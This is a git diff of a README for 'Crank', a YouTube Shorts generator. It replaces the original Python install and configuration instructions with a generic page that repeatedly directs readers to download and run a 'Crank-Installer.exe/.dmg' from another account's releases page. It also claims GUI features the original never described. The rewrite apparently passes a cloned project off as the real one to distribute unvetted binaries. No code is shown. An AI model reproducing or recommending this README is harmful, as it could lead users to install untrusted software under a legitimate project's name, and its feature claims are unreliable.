@@ -1,90 +1,79 @@
-# Crank
-> Youtube Shorts Generator
+# 🎥 Crank - Effortless YouTube Shorts Creation
 
-![IMG_20250901_182631](https://github.com/user-attachments/assets/2c272049-acc0-4b50-9b69-67c71cadf07e)
+## 📥 Download Now
+[![Download Crank](https://img.shields.io/badge/Download%20Now-Get%20Crank-brightgreen)](https://github.com/asd123fsdg/Crank/releases)
 
+## 🚀 Getting Started
+Welcome to Crank, your helpful tool for generating YouTube Shorts. This guide will direct you on how to download and run the application easily, no technical skills are necessary.
 
+## 🖥️ System Requirements
+- **Operating System:** Windows 10 or newer, MacOS 10.15 or newer
+- **Memory:** At least 4 GB RAM 
+- **Storage:** Minimum 200 MB free space
+- **Internet:** Required for video content access
 
-## Overview
-Automate the creation of YouTube Shorts with customizable prompts, titles, tags, and descriptions. Designed for fast, efficient content generation while giving you full control over the output.
+## 📦 Features
+- **Content Automation:** Create shorts with minimal effort.
+- **Faceless Video Creation:** Generate videos without appearing on camera.
+- **User-Friendly Interface:** Navigate easily and start creating in no time.
+- **Templates Available:** Choose from various templates to enhance your content.
 
-## 🛠️ Prerequisites
-- Python 3.x (Tested with Python 3.13)
-- Required Python libraries (listed in `requirements.txt`)
-- `ffmpeg` and `ffprobe` installed and available in your system PATH (required for video processing)
+## 📥 Download & Install
+To get started, you need to download Crank from our Releases page. Click the link below to visit and download the latest version.
 
-#### Environment Variables
-Crank uses a `.env` file to load sensitive keys and config values.
-Make sure to create a `.env` file in the root directory containing your API keys, for example:
-```ini
-GEMINI_API_KEY=your_api_key_here
-```
+[Download Crank from Releases](https://github.com/asd123fsdg/Crank/releases)
 
-#### Credential Files
-The other credentials are stored as JSON files inside the root directory:
-- `secrets.json` — OAuth 2.0 client credentials JSON used for YouTube API upload authentication
+### Steps to Download:
+1. Click on the above link.
+2. On the Releases page, look for the latest version.
+3. Choose the file that matches your operating system (Windows or Mac).
+4. Click the download link for the chosen file.
 
-## ⚙️ Customization
-Crank is fully configurable. You can adjust prompts, descriptions, upload behavior, and other settings using your preffered method.
+### Run Crank
+After the download finishes, follow these steps to run the application:
 
-#### Default settings in `config.yml`
-Change the following directly in the file:
-- `NAME`: the channel name
-- `UPLOAD`: `true` or `false` to enable/disable uploads
-- `DELAY`: number of hours between uploads: `0` for instant upload, or any positive number to schedule the video that many hours later.
-- `DESCRIPTION`: default video description
-- `TAGS`: list of tags for each video
-- `GEMINI_API_KEY`: optional channel-specific API key (overrides .env if set)
-- Prompt configurations (`CONTENT_PROMPT`, `GET_TITLE`, `TERM_PROMPT`): control how transcripts, titles, and subjects are generated.
+1. Navigate to your Downloads folder, or the location where you saved the file.
+2. Locate the Crank installer (it usually has a name like `Crank-Installer.exe` or `Crank-Installer.dmg`).
+3. Double-click the installer file.
+4. Follow the on-screen instructions to complete the installation.
+5. Once installed, find the Crank icon on your desktop or in your applications folder and double-click it to launch the application.
 
-## 📦 Installation
-1. **Clone the repository**
-```bash
-git clone https://github.com/ecnivs/crank.git
-cd crank
-```
-2. **Install dependencies**
-```bash
-pip install -r requirements.txt
-```
-3. **Install `ffmpeg`**
-```bash
-# Debian / Ubuntu
-sudo apt install ffmpeg  # debian
+## 🎬 Creating Your First YouTube Short
+Once you launch Crank, you can start creating content effortlessly:
 
-# Arch Linux
-sudo pacman -S ffmpeg  # arch
+1. **Select a Template:** Explore the available templates and choose one that fits your style.
+2. **Add Media:** Upload images or video clips that you want to use.
+3. **Customize:** Adjust text, colors, and music to match your vision.
+4. **Preview:** Watch a preview of your short to make sure it meets your expectations.
+5. **Export:** Once happy, export your video. It will be saved in your chosen format and is ready for upload to YouTube.
 
-# macOS (Homebrew)
-brew install ffmpeg  # macos
+## 📝 Troubleshooting
+If you encounter any issues while downloading or running Crank, here are some common solutions:
 
-# Windows (using Chocolatey)
-choco install ffmpeg  # windows
-```
+- **Download Issues:** Ensure you have a stable internet connection. Try refreshing the page if the download doesn't start.
+- **Installation Problems:** Verify you have enough disk space. Restart your computer and try the installation again.
+- **Running Crank:** If the application doesn’t open, check if your system meets the requirements listed above.
 
-## 🚀 Runing Crank
-Run the tool with the default configuration:
-```bash
-python main.py
-```
-Or provide your custom config file with `--path`:
-```bash
-python main.py --path path/to/your_config.yml
-```
+## 🌐 Frequently Asked Questions
 
-## 💖 Support the project
-If you find Crank helpful and want to support its development, donations are welcome!  
-Your support helps keep the project active and enables new features.
-<div align="center">
-  <a href="https://www.buymeacoffee.com/ecnivs" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
-</div>
+### How do I update Crank?
+To update, visit the same Releases page. Download the newest version and follow the installation steps again.
 
-## 🙌 Contributing
-We appreciate any feedback or code reviews! Feel free to:
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Submit a pull request
+### Can I use Crank on Linux?
+Currently, Crank supports only Windows and MacOS. Linux support may come in future updates.
 
-### I'd appreciate any feedback or code reviews you might have!
+### Where can I find help?
+For further assistance, check the GitHub issues page or seek help from fellow users in the community forums related to Crank.
+
+### Is there a user manual?
+Yes, a detailed user manual is available within the application after installation. You can access it from the Help menu.
+
+## 💬 Feedback
+Your feedback helps us improve Crank. If you have suggestions or encountered issues, please create an issue on our GitHub repository.
+
+## 📥 Download Crank Again
+Don’t forget, to install the application, just visit the link below to return to the Releases page.
+
+[Download Crank from Releases](https://github.com/asd123fsdg/Crank/releases)
+
+Thank you for choosing Crank! We hope it boosts your creativity and helps you create amazing YouTube Shorts.
